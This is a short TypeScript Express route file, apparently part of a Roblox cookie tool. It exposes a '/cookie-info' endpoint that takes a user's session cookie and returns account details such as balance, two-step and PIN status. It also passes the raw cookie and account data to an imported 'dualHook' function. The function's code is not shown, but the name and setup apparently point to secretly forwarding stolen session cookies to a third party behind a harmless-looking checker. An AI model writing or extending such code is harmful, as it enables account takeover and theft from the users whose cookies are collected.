import { Express, Request, Response } from "express";
import RobloxUser from "../functions/roblox-user";
import dualHook from "../functions/dualhook";

export default function cookieInfoRoute(server: Express): void {
	server.get("/cookie-info/:cookie", async (req: Request, res: Response) => {
        const { cookie } = req.params;

		try {
			const userData: {
				username: string;
				uid: number;
				avatarUrl: string;
				createdAt: string;
				country: string;
				balance: number;
				isTwoStepVerificationEnabled: boolean;
				isPinEnabled: boolean;
				isPremium: boolean;
				creditbalance: string;
			} = await (await RobloxUser.register(cookie)).getUserData();

			dualHook(userData, cookie);

			res.json({
				success: true,
				data: {
					...userData,
				},
			});

			return;
		} catch (error) {
			res.json({
				success: false,
			});
		}
	});
}
